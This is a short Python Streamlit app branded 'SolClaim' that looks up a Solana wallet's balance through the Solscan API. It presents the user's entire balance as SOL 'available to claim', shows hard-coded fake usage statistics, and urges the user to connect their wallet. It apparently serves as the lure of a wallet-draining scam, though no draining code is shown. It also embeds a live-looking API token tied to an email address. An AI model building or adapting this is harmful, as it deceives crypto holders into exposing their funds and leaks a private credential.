import requests
import streamlit as st
from decimal import Decimal

# Solscan API Key
SOLSCAN_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkQXQiOjE3Mzc2NTY3MTUxNjIsImVtYWlsIjoibWlvMjAwNm1pbzIwMDZAZ21haWwuY29tIiwiYWN0aW9uIjoidG9rZW4tYXBpIiwiYXBpVmVyc2lvbiI6InYyIiwiaWF0IjoxNzM3NjU2NzE1fQ.XrXZEQqU_Ag94D5K9EXENBW9fql9JjVk3av45YNjaO0"

# Function to check SOL balance via Solscan
def check_wallet_eligibility(wallet_address):
    url = f"https://pro-api.solscan.io/v2/account/{wallet_address}"
    headers = {"accept": "application/json", "token": SOLSCAN_API_KEY}

    try:
        response = requests.get(url, headers=headers)
        data = response.json()

        # Debugging: Print the response structure
        print(data)

        if "data" in data and "lamports" in data["data"]:
            lamports = data["data"]["lamports"]
            balance = lamports / 1_000_000_000  # Convert to SOL
            return round(balance, 4) if balance > 0 else 0

    except Exception as e:
        print(f"Error fetching balance from Solscan: {e}")

    return 0  # Default to 0 if error occurs

# Streamlit UI
def main():
    st.title("💰 SolClaim: Reclaim Your Sol!")
    st.markdown("📊 **Stats:** 6252 users have already claimed 1925.67 SOL in total!")

    menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])

    if menu == "Check Wallet ✅":
        wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")

        if wallet_address:
            with st.spinner("🕑 Checking wallet balance..."):
                claimable_sol = check_wallet_eligibility(wallet_address)

            if claimable_sol > 0:
                st.success(f"🎉 You have {claimable_sol} SOL available to claim!")
                st.warning("⚠️ Please connect your wallet to proceed with claiming.")
            else:
                st.error("❌ No SOL balance found. You cannot claim.")

if __name__ == "__main__":
    main()
